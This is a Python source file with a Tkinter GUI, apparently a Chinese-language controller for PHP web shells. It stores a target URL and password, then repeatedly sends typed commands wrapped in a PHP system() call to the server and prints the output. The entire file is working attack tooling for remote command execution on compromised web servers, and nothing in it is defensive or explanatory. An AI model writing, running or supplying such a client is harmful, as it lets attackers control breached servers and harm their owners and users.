#coding:utf-8
import requests
#import os
from tkinter import*
from tkinter import messagebox
import sys
import threading


def shell(url,password):
    text = '\n' + ' ' * 42
    text += url.split('/')[2]
    text += '        '+url
    text += '      '+password
    with open('shell.txt','a+') as f:
        f.write(text)
    print("[+]连接成功")
    
    while True:
        
        cmd = input('shell >')

        POST = "system(\'"+ cmd +" \');"
        payload={
            password:POST
        }
        
        print(url)
        response=requests.post(url,payload,timeout=10)
        print(response.text)



#---------------------------------------------------

def start():

    url = en.get()
    password = en_1.get()
    t = threading.Thread(target=shell,args=(url,password))
    t.start()
    #shell(url,password)    #bools = True


def stop():
    sys.exit(0)

#---------------------------------------------------
tk = Tk()
tk.title('php_shell')
tk.geometry('270x150+420+200')
#----------------------------------------------------
en = Entry(tk)
en.place(x=70,y=20)
en_1 = Entry(tk)
en_1.place(x=70,y=60)
#--------------------------text------------------
w= Label(tk,text='网址:',fg="red")
w.place(x=20,y=20)
w_2= Label(tk,text='密码:',fg="red")
w_2.place(x=20,y=60)
#------------------------start or stop----------------
b = Button(tk, text ="连接", command=start)
b.place(x=35,y=90)
b_2 = Button(tk, text ="退出", command=stop)
b_2.place(x=180,y=90)
tk.mainloop()
#------------------------start-GUI--------------------
tk.mainloop()
